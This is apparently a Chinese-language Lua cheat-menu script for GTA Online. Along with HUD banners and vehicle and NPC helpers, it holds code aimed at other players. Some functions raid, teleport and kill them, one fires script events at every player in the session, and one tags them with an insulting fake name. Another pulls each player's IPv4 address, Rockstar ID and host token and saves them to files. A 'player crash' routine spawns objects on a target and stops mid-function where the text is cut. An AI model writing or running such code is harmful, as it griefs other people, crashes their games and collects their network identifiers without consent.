    ENTITY.SET_ENTITY_ROTATION(veh, cam_pos.x, cam_pos.y, cam_pos.z, 1, TRUE);
    ENTITY.SET_ENTITY_COLLISION(veh, not no_collision, TRUE);
    
    local locspeed = speed*10
    local locspeed2 = speed
    if PAD.IS_CONTROL_PRESSED(0, 61) then 
        locspeed = locspeed*2
        locspeed2 = locspeed2*2
    end
    
    if PAD.IS_CONTROL_PRESSED(2, 71) then
        if dont_stop then
            ENTITY.APPLY_FORCE_TO_ENTITY(veh, 1, 0.0, speed, 0.0, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
        else 
            VEHICLE.SET_VEHICLE_FORWARD_SPEED(veh, locspeed)
        end
	end
    if PAD.IS_CONTROL_PRESSED(2, 72) then
		local lsp = speed
        if not PAD.IS_CONTROL_PRESSED(0, 61) then 
            lsp = speed * 2
        end
        if dont_stop then
            ENTITY.APPLY_FORCE_TO_ENTITY(veh, 1, 0.0, 0 - (lsp), 0.0, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
        else 
            VEHICLE.SET_VEHICLE_FORWARD_SPEED(veh, 0 - (locspeed));
        end
   end
    if PAD.IS_CONTROL_PRESSED(2, 63) then
        local lsp = (0 - speed)*2
        if not PAD.IS_CONTROL_PRESSED(0, 61) then 
            lsp = 0 - speed
        end
        if dont_stop then
            ENTITY.APPLY_FORCE_TO_ENTITY(veh, 1, (lsp), 0.0, 0.0, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
        else 
            ENTITY.APPLY_FORCE_TO_ENTITY(veh, 1, 0 - (locspeed), 0.0, 0.0, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1);
        end
	end
    if PAD.IS_CONTROL_PRESSED(2, 64) then
        local lsp = speed
        if not PAD.IS_CONTROL_PRESSED(0, 61) then 
            lsp = speed*2
        end
        if dont_stop then
            ENTITY.APPLY_FORCE_TO_ENTITY(veh, 1, lsp, 0.0, 0.0, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
        else 
            ENTITY.APPLY_FORCE_TO_ENTITY(veh, 1, locspeed, 0.0, 0.0, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
        end
    end
	if not dont_stop and not PAD.IS_CONTROL_PRESSED(2, 71) and not PAD.IS_CONTROL_PRESSED(2, 72) then
        VEHICLE.SET_VEHICLE_FORWARD_SPEED(veh, 0.0);
    end
end

--杂项
--原创功能 缝合死妈
function hengfugt(f)
    starttime = os.time()
    local startX = -0.5
    local endX = 0.5
    local speed = 0.001
    hfgt = f
    while hfgt do
        wait()
        startX = startX + speed
        endX = endX + speed
        if startX >= 0.5 then
            startX = -0.5
            endX = 0.5
        end
        GRAPHICS.DRAW_RECT(.5, .47, 1, 0.01, 255, 0, 0, 200)
        GRAPHICS.DRAW_RECT(.5, .48, 1, 0.01, 255, 128, 0, 200)
        GRAPHICS.DRAW_RECT(.5, .49, 1, 0.01, 255, 255, 0, 200)
        GRAPHICS.DRAW_RECT(.5, .50, 1, 0.01, 0, 255, 0, 200)
        GRAPHICS.DRAW_RECT(.5, .51, 1, 0.01, 0, 255, 255, 200)
        GRAPHICS.DRAW_RECT(.5, .52, 1, 0.01, 0, 75, 255, 200)
        GRAPHICS.DRAW_RECT(.5, .53, 1, 0.01, 128, 0, 255, 200)

        HUD.END_TEXT_COMMAND_DISPLAY_TEXT(0.085, 0.10)
        HUD.SET_TEXT_SCALE(0.5, 0.4)
        HUD.SET_TEXT_FONT(0)
        HUD.SET_TEXT_CENTRE(1)
        HUD.SET_TEXT_OUTLINE(0)
        HUD.SET_TEXT_COLOUR(255, 255, 255, 255)
        util.BEGIN_TEXT_COMMAND_DISPLAY_TEXT("~h~检测到皇榜会员 " .. playerid .. " 正在该战局")
        HUD.END_TEXT_COMMAND_DISPLAY_TEXT(startX + 0.5, 0.480)

        if os.time() - starttime >= 7 then
        hfgt = false
        return
        end
        end
        --hfgt = false
    end
--开发横幅
function devhengfu(f)
    starttime = os.time()
    local startX = -0.5
    local endX = 0.5
    local speed = 0.001
    devhf = f
    while devhf do
        wait()
        startX = startX + speed
        endX = endX + speed
        if startX >= 0.5 then
            startX = -0.5
            endX = 0.5
        end
        
        GRAPHICS.DRAW_RECT(.5, .30, 1, 0.05, 255, 90, 160, 255)
        GRAPHICS.DRAW_RECT(.5, .31, 1, 0.05, 255, 160, 190, 255)
        GRAPHICS.DRAW_RECT(.5, .33, 1, 0.011, 255, 90, 160, 255)

        HUD.END_TEXT_COMMAND_DISPLAY_TEXT(0.085, 0.10)
        HUD.SET_TEXT_SCALE(0.5, 0.45)
        HUD.SET_TEXT_FONT(0)
        HUD.SET_TEXT_CENTRE(1)
        HUD.SET_TEXT_OUTLINE(0)
        HUD.SET_TEXT_COLOUR(255, 255, 255, 255)
        util.BEGIN_TEXT_COMMAND_DISPLAY_TEXT("~h~GTLua开发人员 " .. playerrid .. " 目前在你的战局")
        HUD.END_TEXT_COMMAND_DISPLAY_TEXT(startX + 0.5, 0.285)
        
        if os.time() - starttime >= 7 then
        devhf = false
        end
        end
        --devhf = false
    end
--入侵载具
function control_vehicle(pid, output_toast, callback, opts)
    local vehicle = ent_func.get_player_vehicle_in_control(pid, opts)
    if vehicle ~= 0 then
        callback(vehicle)
        return true
    else
        if output_toast then
            util.toast("被随机锁定的玩家并不在载具内")
        end
        return false
    end
end
--车辆进入枪
function driveitgun()
	entitodrive = memory.alloc_int()
	if PLAYER.GET_ENTITY_PLAYER_IS_FREE_AIMING_AT(PLAYER.PLAYER_ID(), entitodrive) then
		if PAD.IS_CONTROL_PRESSED(1, 23) then
			PED.SET_PED_INTO_VEHICLE(plyped(), memory.read_int(entitodrive), -1)
		end
	end
	memory.free(entitodrive)
end
--启动页面3
function huanyingjiemian(f) 
    local rainbowr = 255
    local rainbowg = 255
    local rainbowb = 255
    local startX = 0.5     
    local endX = 0.5      
    local startY = -0.15     
    local endY = 0.01 
    local speed = 0.0005
    hfgt = f
    local timer = os.clock() 
    while hfgt and os.clock() - timer <= 4 do 
        wait()
        startY = startY + speed 
        endY = endY + speed 
        if startY >= 0.3 then
            startY = -0.1
            endY = -0.1
        end
        rainbowr = rainbowr + math.random(0, 8)
        rainbowg = rainbowg + math.random(0, 8)
        rainbowb = rainbowb + math.random(0, 8)
        if rainbowr > 255 then
        rainbowr = rainbowr - 255
        end
        if rainbowg > 255 then
        rainbowg = rainbowg - 255
        end
        if rainbowb > 255 then
        rainbowb = rainbowb - 255
        end
        GRAPHICS.DRAW_RECT(startX, startY + 0.23, 1, 0.03, 255, 0, 0, 200) --红
        GRAPHICS.DRAW_RECT(startX, startY + 0.26, 1, 0.03, 255, 128, 0, 200) --橙
        GRAPHICS.DRAW_RECT(startX, startY + 0.29, 1, 0.03, 255, 255, 0, 200) --黄
        GRAPHICS.DRAW_RECT(startX, startY + 0.32, 1, 0.03, 0, 255, 0, 200) --绿
        GRAPHICS.DRAW_RECT(startX, startY + 0.35, 1, 0.03, 0, 255, 255, 200) --青
        GRAPHICS.DRAW_RECT(startX, startY + 0.38, 1, 0.03, 0, 75, 255, 200) --蓝
        GRAPHICS.DRAW_RECT(startX, startY + 0.41, 1, 0.03, 128, 0, 255, 200) --紫
        HUD.END_TEXT_COMMAND_DISPLAY_TEXT(0.085, 0.10)
        HUD.SET_TEXT_SCALE(0.5, 2.1)
        HUD.SET_TEXT_FONT(0)
        HUD.SET_TEXT_CENTRE(1)
        HUD.SET_TEXT_OUTLINE(0)
        HUD.SET_TEXT_COLOUR(rainbowr, rainbowg, rainbowb, 200)
        util.BEGIN_TEXT_COMMAND_DISPLAY_TEXT("~h~GRANDTOURINGVIP")
        HUD.END_TEXT_COMMAND_DISPLAY_TEXT(startX, startY + 0.23) 
    end
end
--hundouluo
function hunhuan9()
hunhuan()
hunhuan1()
hunhuan2()
hunhuan3()
hunhuan4()
hunhuan5()
hunhuan6()
hunhuan7()
hunhuan8()
end
--强制云保存
function savedata()
    menu.trigger_commands("forcecloudsave")
end
--忍者枪
function request_animation(hash)
    STREAMING.REQUEST_ANIM_DICT(hash)
    while not STREAMING.HAS_ANIM_DICT_LOADED(hash) do
        util.yield()
    end
end
--实体管理
function fixveh( vehicle )
	vel = ENTITY.GET_ENTITY_VELOCITY(vehicle)
	VEHICLE.SET_VEHICLE_FIXED(vehicle)
	VEHICLE.SET_VEHICLE_ENGINE_HEALTH(vehicle, 1000)
	ENTITY.SET_ENTITY_VELOCITY(vehicle, vel.x, vel.y, vel.z)
end
--截货
function takerestore(pid)
    menu.trigger_commands("raid" .. players.get_name(pid))
    wait(5000)
    menu.trigger_commands("kill" .. players.get_name(pid))
end
--送回家暴毙
function takehome(pid)
    menu.trigger_commands("aptme" .. players.get_name(pid))
    wait(10000)
    menu.trigger_commands("kill" .. players.get_name(pid))
end
--扫描
function saomiaoziti(f)
saomiao = f
while saomiao do
wait() 
saomiao = true 
if saomiao then 
    local text = "~h~~r~正在扫描你的身份..." 
    for i = 0, string.len(text) do 
        local subtext = string.sub(text, 1, i) 
        HUD.SET_TEXT_SCALE(3.0,1.5) 
        HUD.SET_TEXT_FONT(0) 
        HUD.SET_TEXT_CENTRE(1) 
        HUD.SET_TEXT_OUTLINE(0) 
        HUD.SET_TEXT_COLOUR(60, 255, 255, 255) 
        HUD.BEGIN_TEXT_COMMAND_DISPLAY_TEXT("STRING") 
        HUD.ADD_TEXT_COMPONENT_SUBSTRING_PLAYER_NAME(subtext) 
        HUD.END_TEXT_COMMAND_DISPLAY_TEXT(0.53,0.15,0) 
        wait(10) 
    end 
end
end
end

function smyuan(f)
    local v3=v3.new
    local radius1 = 0.5
    local radius2 = 0.5
    local numSegments = 1000
    local segmentAngle = 360 / numSegments
    local centerY1 = 0
    local centerY2 = 0
    local centerY3 = 0
    local centerY4 = 0
    local speed1 = 0.030
    local speed2 = 0.030
    local speed3 = 0.030
    local speed4 = 0.030
    saomiao1 = f
    while saomiao1 do
    wait(0)
         local c = ENTITY.GET_ENTITY_COORDS(players.user_ped())
         centerY1 = centerY1 + speed1
         if centerY1 > 0.8 then
              speed1 = -0.030
         elseif centerY1 < -1 then
              speed1 = 0.030
         end
         centerY2 = centerY2 + speed2
         if centerY2 > 0.6 then
              speed2 = -0.030
         elseif centerY2 < -1 then
              speed2 = 0.030
         end
         centerY3 = centerY3 + speed3
         if centerY3 > 1.0 then
              speed3 = -0.030
         elseif centerY3 < -1 then
              speed3 = 0.030
         end
         centerY4 = centerY4 + speed4
         if centerY4 > 0.4 then
              speed4 = -0.030
         elseif centerY4 < -1 then
              speed4 = 0.030
         end
         for i = 1, numSegments do
             local angle1 = math.rad((i-1) * segmentAngle)
             local angle2 = math.rad(i * segmentAngle)
             local x1 = radius1 * math.cos(angle1)
             local y1 = radius1 * math.sin(angle1)
             local x2 = radius1 * math.cos(angle2)
             local y2 = radius1 * math.sin(angle2)
             GRAPHICS.DRAW_LINE(c.x + x1, c.y + y1 , c.z+0.2+ centerY1, c.x + x2, c.y + y2 , c.z+0.1+ centerY1, 0, 255, 0, 255)
             x1 = radius2 * math.cos(angle1)
             y1 = radius2 * math.sin(angle1)
             x2 = radius2 * math.cos(angle2)
             y2 = radius2 * math.sin(angle2)
             GRAPHICS.DRAW_LINE(c.x + x1, c.y + y1 , c.z+0.2+ centerY2, c.x + x2, c.y + y2 , c.z+0.1+ centerY2, 255, 255, 0, 255)
             cx1 = radius2 * math.cos(angle1)
             cy1 = radius2 * math.sin(angle1)
             cx2 = radius2 * math.cos(angle2)
             cy2 = radius2 * math.sin(angle2)
             GRAPHICS.DRAW_LINE(c.x + cx1, c.y + cy1 , c.z+0.2+ centerY3, c.x + cx2, c.y + cy2 , c.z+0.1+ centerY3, 255, 0, 0, 255)
             dx1 = radius2 * math.cos(angle1)
             dy1 = radius2 * math.sin(angle1)
             dx2 = radius2 * math.cos(angle2)
             dy2 = radius2 * math.sin(angle2)
             GRAPHICS.DRAW_LINE(c.x + dx1, c.y + dy1 , c.z+0.2+ centerY4, c.x + dx2, c.y + dy2 , c.z+0.1+ centerY4, 0, 255, 255, 255)
         end
    end
    end

--帮会等级
function get_stat_int(stat)
    local ptr = memory.alloc_int()
    STATS.STAT_GET_INT(util.joaat(stat), ptr, -1)
    return memory.read_int(ptr)
end

function set_stat_int(stat, value)
    STATS.STAT_SET_INT(util.joaat(stat), value, true)
end

--友好载具类型
Vehicle_MissionType = {
    ListItem = {
        { "巡航",             {}, "巡航" },
        { "猛撞",                {}, "猛撞" },
        { "阻挡",              {}, "阻挡" },
        { "前往",              {}, "前往" },
        { "停止",               {}, "停止" },
        { "攻击",             {}, "攻击" },
        { "跟随",             {}, "跟随" },
        { "逃跑",               {}, "逃跑" },
        { "围绕",             {}, "围绕" },
        { "左边护送",        {}, "左边护送" },
        { "右边护送",       {}, "右边护送" },
        { "后面护送",        {}, "后面护送" },
        { "前面护送",       {}, "前面护送" },
        { "参加比赛",       {}, "参加比赛" },
        { "跟踪录制",   {}, "跟踪录制" },
        { "警察行为",   {}, "警察行为" },
        { "原地打转", {}, "原地打转" },
        { "并行停车",      {}, "并行停车" },
        { "降落",               {}, "降落" },
        { "降落并等待",      {}, "降落并等待" },
        { "碰撞",              {}, "碰撞" },
        { "靠边停车",          {}, "靠边停车" },
        { "保护",            {}, "保护" },
    },
    ValueList = {
        1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23,
    }
}
---@param ped Ped
function disable_ped_flee_attributes(ped)
    if ENTITY.DOES_ENTITY_EXIST(ped) and ENTITY.IS_ENTITY_A_PED(ped) then
        PED.SET_PED_COMBAT_ATTRIBUTES(ped, 6, false)  -- FLEE_WHILST_IN_VEHICLE
        PED.SET_PED_COMBAT_ATTRIBUTES(ped, 17, false) -- ALWAYS_FLEE
        PED.SET_PED_COMBAT_ATTRIBUTES(ped, 46, true)  -- CAN_FIGHT_ARMED_PEDS_WHEN_NOT_ARMED
        PED.SET_PED_COMBAT_ATTRIBUTES(ped, 58, true)  -- DISABLE_FLEE_FROM_COMBAT
        PED.SET_PED_COMBAT_ATTRIBUTES(ped, 78, true)  -- DISABLE_ALL_RANDOMS_FLEE

        PED.SET_PED_FLEE_ATTRIBUTES(ped, 512, true)   -- NEVER_FLEE
    end
end
--载具内敌人攻击
---@param pedType int
---@param modelHash Hash
---@param x float
---@param y float
---@param z float
---@param heading float
---@return Ped
function Create_Network_Ped(pedType, modelHash, x, y, z, heading)
    request_model(modelHash)
    local ped = PED.CREATE_PED(pedType, modelHash, x, y, z, heading, true, true)

    ENTITY.SET_ENTITY_LOAD_COLLISION_FLAG(ped, true)
    ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ped, true, false)
    ENTITY.SET_ENTITY_SHOULD_FREEZE_WAITING_ON_COLLISION(ped, true)

    NETWORK.NETWORK_REGISTER_ENTITY_AS_NETWORKED(ped)
    local net_id = NETWORK.PED_TO_NET(ped)
    NETWORK.SET_NETWORK_ID_EXISTS_ON_ALL_MACHINES(net_id, true)
    NETWORK.SET_NETWORK_ID_CAN_MIGRATE(net_id, true)
    for _, pid in pairs(players.list()) do
        NETWORK.SET_NETWORK_ID_ALWAYS_EXISTS_FOR_PLAYER(net_id, pid, true)
    end

    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(modelHash)
    return ped
end
---增强NPC作战能力
---@param ped Ped
---@param isGodmode boolean? [default = false]
---@param canRagdoll boolean? [default = true]
function increase_ped_combat_ability(ped, isGodmode, canRagdoll)
    if isGodmode == nil then isGodmode = false end
    if canRagdoll == nil then canRagdoll = true end

    if ENTITY.DOES_ENTITY_EXIST(ped) and ENTITY.IS_ENTITY_A_PED(ped) then
        ENTITY.SET_ENTITY_INVINCIBLE(ped, isGodmode)
        ENTITY.SET_ENTITY_PROOFS(ped, isGodmode, isGodmode, isGodmode, isGodmode, isGodmode, isGodmode, isGodmode,
            isGodmode)
        PED.SET_PED_CAN_RAGDOLL(ped, canRagdoll)

        --- PERCEPTIVE ---
        PED.SET_PED_HIGHLY_PERCEPTIVE(ped, true)
        PED.SET_PED_VISUAL_FIELD_PERIPHERAL_RANGE(ped, 500.0)
        PED.SET_PED_SEEING_RANGE(ped, 500.0)
        PED.SET_PED_HEARING_RANGE(ped, 500.0)
        PED.SET_PED_ID_RANGE(ped, 500.0)
        PED.SET_PED_VISUAL_FIELD_MIN_ANGLE(ped, 90.0)
        PED.SET_PED_VISUAL_FIELD_MAX_ANGLE(ped, 90.0)
        PED.SET_PED_VISUAL_FIELD_MIN_ELEVATION_ANGLE(ped, 90.0)
        PED.SET_PED_VISUAL_FIELD_MAX_ELEVATION_ANGLE(ped, 90.0)
        PED.SET_PED_VISUAL_FIELD_CENTER_ANGLE(ped, 90.0)

        --- WEAPON ---
        PED.SET_PED_CAN_SWITCH_WEAPON(ped, true)
        WEAPON.SET_PED_INFINITE_AMMO_CLIP(ped, true)
        PED.SET_PED_SHOOT_RATE(ped, 1000)
        PED.SET_PED_ACCURACY(ped, 100)

        --- COMBAT ---
        PED.SET_PED_COMBAT_ABILITY(ped, 2)       -- Professional
        PED.SET_PED_COMBAT_RANGE(ped, 2)         -- Far
        -- PED.SET_PED_COMBAT_MOVEMENT(ped, 2) -- WillAdvance
        PED.SET_PED_TARGET_LOSS_RESPONSE(ped, 1) -- NeverLoseTarget

        --- FLEE ATTRIBUTES ---
        PED.SET_PED_FLEE_ATTRIBUTES(ped, 512, true) -- NEVER_FLEE

        --- TASK ---
        TASK.SET_PED_PATH_CAN_USE_CLIMBOVERS(ped, true)
        TASK.SET_PED_PATH_CAN_USE_LADDERS(ped, true)
        TASK.SET_PED_PATH_CAN_DROP_FROM_HEIGHT(ped, true)
        TASK.SET_PED_PATH_AVOID_FIRE(ped, false)
        TASK.SET_PED_PATH_MAY_ENTER_WATER(ped, true)

        PED.SET_PED_SUFFERS_CRITICAL_HITS(ped, false) -- Sets if a healthy character can be killed by a single bullet (e.g. headshot)
    end
end

---增强NPC作战属性
---@param ped Ped
function increase_ped_combat_attributes(ped)
    if ENTITY.DOES_ENTITY_EXIST(ped) and ENTITY.IS_ENTITY_A_PED(ped) then
        PED.SET_PED_COMBAT_ATTRIBUTES(ped, 4, true)   --Can Use Dynamic Strafe Decisions
        PED.SET_PED_COMBAT_ATTRIBUTES(ped, 5, true)   --Always Fight
        PED.SET_PED_COMBAT_ATTRIBUTES(ped, 6, false)  --Flee Whilst In Vehicle
        PED.SET_PED_COMBAT_ATTRIBUTES(ped, 13, true)  --Aggressive
        PED.SET_PED_COMBAT_ATTRIBUTES(ped, 14, true)  --Can Investigate
        PED.SET_PED_COMBAT_ATTRIBUTES(ped, 17, false) --Always Flee
        PED.SET_PED_COMBAT_ATTRIBUTES(ped, 20, true)  --Can Taunt In Vehicle
        PED.SET_PED_COMBAT_ATTRIBUTES(ped, 21, true)  --Can Chase Target On Foot
        PED.SET_PED_COMBAT_ATTRIBUTES(ped, 22, true)  --Will Drag Injured Peds to Safety
        PED.SET_PED_COMBAT_ATTRIBUTES(ped, 24, true)  --Use Proximity Firing Rate
        PED.SET_PED_COMBAT_ATTRIBUTES(ped, 27, true)  --Perfect Accuracy
        PED.SET_PED_COMBAT_ATTRIBUTES(ped, 28, true)  --Can Use Frustrated Advance
        PED.SET_PED_COMBAT_ATTRIBUTES(ped, 29, true)  --Move To Location Before Cover Search
        PED.SET_PED_COMBAT_ATTRIBUTES(ped, 38, true)  --Disable Bullet Reactions
        PED.SET_PED_COMBAT_ATTRIBUTES(ped, 39, true)  --Can Bust
        PED.SET_PED_COMBAT_ATTRIBUTES(ped, 41, true)  --Can Commandeer Vehicles
        PED.SET_PED_COMBAT_ATTRIBUTES(ped, 42, true)  --Can Flank
        PED.SET_PED_COMBAT_ATTRIBUTES(ped, 46, true)  --Can Fight Armed Peds When Not Armed
        PED.SET_PED_COMBAT_ATTRIBUTES(ped, 49, false) --Use Enemy Accuracy Scaling
        PED.SET_PED_COMBAT_ATTRIBUTES(ped, 52, true)  --Use Vehicle Attack
        PED.SET_PED_COMBAT_ATTRIBUTES(ped, 53, true)  --Use Vehicle Attack If Vehicle Has Mounted Guns
        PED.SET_PED_COMBAT_ATTRIBUTES(ped, 54, true)  --Always Equip Best Weapon
        PED.SET_PED_COMBAT_ATTRIBUTES(ped, 55, true)  --Can See Underwater Peds
        PED.SET_PED_COMBAT_ATTRIBUTES(ped, 58, true)  --Disable Flee From Combat
        PED.SET_PED_COMBAT_ATTRIBUTES(ped, 60, true)  --Can Throw Smoke Grenade
        PED.SET_PED_COMBAT_ATTRIBUTES(ped, 78, true)  --Disable All Randoms Flee
    end
end
--
function GET_INTERIOR_FROM_PLAYER(pid)
    return memory.read_int(memory.script_global(((2657589 + 1) + (pid * 466)) + 245))
end
speed = menu.get_value(menu.ref_by_path("Self>Movement>Levitation>Movement Speed"))
sprint = menu.get_value(menu.ref_by_path("Self>Movement>Levitation>Sprint Multiplier"))
--
function fku()
if PED.IS_PED_A_PLAYER(players.user_ped()) then
    pos = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    local c = players.get_position(players.user())
    WIRI_GRAPHICS.DRAW_MARKER(25, c.x, c.y, c.z-0.85, 0, 180, 0, 0, 180, 0, 1, 1, 1, 255, 0, 0, 255, false, true, 2, 0, 0, 0, false)
    WIRI_GRAPHICS.DRAW_MARKER(25, c.x, c.y, c.z-0.85, 0, 180, 0, 0, 180, 0, 2, 2, 2,  255, 128, 0, 255, false, true, 2, 0, 0, 0, false)
    WIRI_GRAPHICS.DRAW_MARKER(25, c.x, c.y, c.z-0.85, 0, 180, 0, 0, 180, 0, 3, 3, 3, 255, 255, 0, 255, false, true, 2, 0, 0, 0, false)
    WIRI_GRAPHICS.DRAW_MARKER(25, c.x, c.y, c.z-0.85, 0, 180, 0, 0, 180, 0, 5, 5, 5, 0, 255, 0, 255, false, true, 2, 0, 0, 0, false)
    WIRI_GRAPHICS.DRAW_MARKER(25, c.x, c.y, c.z-0.85, 0, 180, 0, 0, 180, 0, 8, 8, 8, 0, 255, 255, 255, false, true, 2, 0, 0, 0, false)
    WIRI_GRAPHICS.DRAW_MARKER(25, c.x, c.y, c.z-0.85, 0, 180, 0, 0, 180, 0, 13, 13, 13, 0, 75, 255, 255, false, true, 2, 0, 0, 0, false)
    WIRI_GRAPHICS.DRAW_MARKER(25, c.x, c.y, c.z-0.85, 0, 180, 0, 0, 180, 0, 21, 21, 21, 128, 0, 255, 255, false, true, 2, 0, 0, 0, false)
    WIRI_GRAPHICS.DRAW_MARKER(25, c.x, c.y, c.z-0.85, 0, 180, 0, 0, 180, 0, 34, 34, 34, 255, 0, 0, 255, false, true, 2, 0, 0, 0, false)
    WIRI_GRAPHICS.DRAW_MARKER(25, c.x, c.y, c.z-0.85, 0, 180, 0, 0, 180, 0, 55, 55, 1, 255, 255, 0, 255, false, true, 2, 0, 0, 0, false)
    end
end
--sb
function woshishabi(f)
    if players.user() == pid then
        gtoast("你难道说自己是傻逼?")
        return
    end
    wait()
    local pedp  = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    gametag = WIRI_HUD.CREATE_FAKE_MP_GAMER_TAG(pedp,"我是傻逼",false,false,"flakin",0)
end
--上岛
function sendscriptevent_three()--上岛
    for pid = 0, 31 do
        if pid ~= players.user() and players.exists(pid) then
            util.trigger_script_event(1 << pid, {3592101251, 1, 0, -1, 4, 127, 0, 0, 0,PLAYER.GET_PLAYER_INDEX(), pid})
        end
    end
end
--
function player_ip(pid)
    local connectIP = players.get_connect_ip(pid)
    local ipStringplayer = string.format("%d.%d.%d.%d",
    math.floor(connectIP / 2^24) % 256,
    math.floor(connectIP / 2^16) % 256,
    math.floor(connectIP / 2^8) % 256,
    connectIP % 256)
    if ipStringplayer == "255.255.255.255" then
        return "Connected to Relay"
    else
        return ipStringplayer
    end
end

local lujing = filesystem.scripts_dir().."GTLuaScript\\"
if not filesystem.exists(lujing.."Players") then
	filesystem.mkdir(lujing.."Players")
end

function save_player_info(pid)
    local name_with_tags = players.get_name_with_tags(pid)
    local name = players.get_name(pid)
    local rockstar_id = players.get_rockstar_id(pid)
    local is_modder = players.is_marked_as_modder(pid)
    local rank = players.get_rank(pid)
    local money = players.get_money(pid)
    local moneyStr = ""
    if money >= 1000000000 then
        moneyStr = string.format("%.1fb", money / 1000000000)
    elseif money >= 1000000 then
        moneyStr = string.format("%.1fm", money / 1000000)
    elseif money >= 1000 then
        moneyStr = string.format("%.1fk", money / 1000)
    else
        moneyStr = tostring(money)
    end
    local kd = players.get_kd(pid)
    local is_using_vpn = players.is_using_vpn(pid)
    local player_ip = player_ip(pid)
    local language_int = language_string(players.get_language(pid))
    local is_attacker = players.is_marked_as_attacker(pid)
    local host_token = players.get_host_token_hex(pid)
    local is_using_controller = players.is_using_controller(pid)
    local clan_motto = players.clan_get_motto(pid)
    local filename = name .. ".txt"
    local filepath = lujing .. "Players/" .. filename
  
    if filesystem.exists(filepath) then
        gtoast(string.format("错误:%s's 的信息已被保存到文件中.", name))
    else
        if not filesystem.exists(lujing .. "Players") then
            filesystem.mkdir(lujing .. "Players")
        end
  
        -- Create the file and write the player's information to it
        -- There is probably a better way to do this, but it works, so I won't re-write it
        local file = io.open(filepath, "w")
        file:write(os.date("[保存时间]\n--[%d-%m-%y %I:%M:%S]\n"), "")
        file:write("姓名与标签: ", name_with_tags, "\n")
        file:write("RID: ", rockstar_id, "\n")
        file:write("作弊者: ", is_modder and "是" or "否", "\n")
        file:write("等级: ", rank, "\n")
        file:write("金钱: ", moneyStr, "\n")
        file:write("K/D: ", kd, "\n")
        file:write("VPN是否使用: ", is_using_vpn and "是" or "否", "\n")
        file:write("IPv4: ", player_ip, "\n")
        file:write("语言: ", language_int, "\n")
        file:write("是否为攻击者: ", is_attacker and "是" or "否", "\n")
        file:write("主机令牌: ", host_token, "\n")
        file:write("控制器是否使用: ", is_using_controller and "是" or "否", "\n")
        file:write("帮会: ", clan_motto, "\n")
        file:close()
        gtoast(string.format("%s的信息已保存到文件中.", name))
    end
end
--
function IS_PLAYER_PED(ped)
    if PED.GET_PED_TYPE(ped) < 4 then
        return true
    else
        return false
    end
end
--
function exclude()
    for _, ped in pairs(entities.get_all_peds_as_handles()) do
        if ENTITY.IS_ENTITY_DEAD(ped) then goto out end
        local PedPos = v3.new(players.get_position(pid))
        local AddPos = v3.new(players.get_position(pid))
        AddPos:add(v3.new(0, 0, 1))
        MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(AddPos.x, AddPos.y, AddPos.z, PedPos.x, PedPos.y, PedPos.z, 100,
            true,
            0x6E7DDDEC, pid, false, true, 1)
        ::out::
    end
end
function excludea()
    for _, ped in pairs(entities.get_all_peds_as_handles()) do
        if ENTITY.IS_ENTITY_DEAD(ped) then goto out end
        local PedPos = v3.new(players.get_position(pid))
        local AddPos = v3.new(players.get_position(pid))
        AddPos:add(v3.new(0, 0, 1))
        MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(AddPos.x, AddPos.y, AddPos.z, PedPos.x, PedPos.y, PedPos.z, 100,
            true,
            0x6E7DDDEC, pid, false, true, 1)
        ::out::
    end
end
function excludeb()
        for _, pid in pairs(entities.get_all_peds_as_handles()) do
            if PED.GET_VEHICLE_PED_IS_USING(pid) ~= 0 then goto out end


            local PedPos = v3.new(players.get_position(pid))
            local AddPos = v3.new(players.get_position(pid))
            AddPos:add(v3.new(0, 0, 1))
            MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(AddPos.x, AddPos.y, AddPos.z, PedPos.x, PedPos.y, PedPos.z, 100,
                true,
                0x6E7DDDEC, pid, false, true, 1)
            ::out::
        end
    end
function excludec()
        for _, pid in pairs(entities.get_all_peds_as_handles()) do
            if IS_PLAYER_PED(pid) then goto out end

            TASK.CLEAR_PED_TASKS_IMMEDIATELY(pid)
            ::out::
        end
    end
function excluded()
    for _, pid in pairs(entities.get_all_peds_as_handles()) do
        if IS_PLAYER_PED(pid) then goto out end

        local PedPos = v3.new(players.get_position(pid))
        local AddPos = v3.new(players.get_position(pid))
        AddPos:add(v3.new(0, 0, 1))
        MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(AddPos.x, AddPos.y, AddPos.z, PedPos.x, PedPos.y, PedPos.z, 100,
            true,
            0x6E7DDDEC, pid, false, true, 1)
        ::out::
    end
end
function excludee()
        for _, pid in pairs(entities.get_all_peds_as_handles()) do
            if IS_PLAYER_PED(pid) or PED.GET_VEHICLE_PED_IS_USING(pid) ~= 0 then goto out end


            local PedPos = v3.new(players.get_position(pid))
            local AddPos = v3.new(players.get_position(pid))
            AddPos:add(v3.new(0, 0, 1))
            MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(AddPos.x, AddPos.y, AddPos.z, PedPos.x, PedPos.y, PedPos.z, 100,
                true,
                0x6E7DDDEC, pid, false, true, 1)
            ::out::
        end
    end
--
------------------------------------
-------------玩家崩溃---------------
------------------------------------
function fireworkcrash(PlayerID)
    notification("寂寞陪伴着他们...")
    local cord = getEntityCoords(getPlayerPed(PlayerID))
    local object = entities.create_object(util.joaat("docktrailer"), cord, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)))
    local object = entities.create_object(util.joaat("docktug"), cord, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)))
    local object = entities.create_object(util.joaat("trailers2"), cord, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)))
